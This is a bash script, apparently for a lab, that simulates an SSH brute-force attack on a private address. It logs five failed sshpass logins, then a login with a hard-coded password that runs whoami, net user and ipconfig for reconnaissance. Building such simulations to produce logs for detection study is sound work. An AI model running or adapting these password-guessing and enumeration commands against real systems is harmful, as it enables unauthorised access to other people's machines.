#!/bin/bash

# Log file
LOG_FILE="ssh_attack_log.txt"
TIMESTAMP=$(date "+%Y-%m-%d %H:%M:%S")

echo "=== SSH Brute Force Simulation ===" >> $LOG_FILE
echo "Start Time: $TIMESTAMP" >> $LOG_FILE
echo "" >> $LOG_FILE

# Attempt 1-5: Wrong passwords
for i in {1..5}; do
  echo "[$(date '+%H:%M:%S')] Attempt $i: sshpass -p 'wrongpass$i' ssh -l vbox 192.168.56.102 'exit'" >> $LOG_FILE
  sshpass -p "wrongpass$i" ssh -l vbox 192.168.56.102 "exit" 2>&1 | head -1 >> $LOG_FILE
  sleep 2
done

# Attempt 6: Correct password (successful compromise)
echo "[$(date '+%H:%M:%S')] Attempt 6 (SUCCESSFUL): Executing reconnaissance commands" >> $LOG_FILE
sshpass -p "realpass" ssh -l realsys 192.168.56.102 "whoami" 2>&1 >> $LOG_FILE
sleep 1
sshpass -p "realpass" ssh -l realsys 192.168.56.102 "net user" 2>&1 | head -5 >> $LOG_FILE
sleep 1
sshpass -p "realpass" ssh -l realsys 192.168.56.102 "ipconfig" 2>&1 >> $LOG_FILE

echo "" >> $LOG_FILE
echo "End Time: $(date '+%Y-%m-%d %H:%M:%S')" >> $LOG_FILE
